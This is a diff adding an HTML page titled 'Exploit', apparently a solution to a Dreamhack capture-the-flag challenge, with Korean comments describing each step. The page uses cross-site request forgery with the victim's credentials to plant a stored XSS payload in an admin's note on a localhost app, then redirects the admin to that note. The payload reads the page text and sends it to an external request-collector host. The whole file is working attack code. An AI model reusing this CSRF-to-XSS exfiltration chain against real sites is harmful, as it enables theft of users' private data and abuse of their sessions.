@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Exploit</title>
+</head>
+<body>
+<script>
+(function () {
+  // 1) admin의 일기에 삽입될 XSS payload
+  const xssPayload = `
+<script>
+  (function() {
+    try {
+      var text = document.body.innerText;
+      var i = new Image();
+      i.src = "https://aamwmrn.request.dreamhack.games/?leak=" + encodeURIComponent(text);
+    } catch (e) {}
+  })();
+</` + `script>
+`;
+
+  // 2) CSRF로 admin의 /note에 XSS payload 삽입
+  const formData = new FormData();
+  formData.append("content", xssPayload);
+
+  fetch("http://localhost:3000/note", {
+    method: "POST",
+    body: formData,
+    credentials: "include"
+  }).then(function() {
+    // 3) admin이 자기 /note 페이지를 열도록 유도
+    window.location = "http://localhost:3000/note";
+  }).catch(function(e) {
+    window.location = "http://localhost:3000/note";
+  });
+
+})();
+</script>
+</body>
+</html>
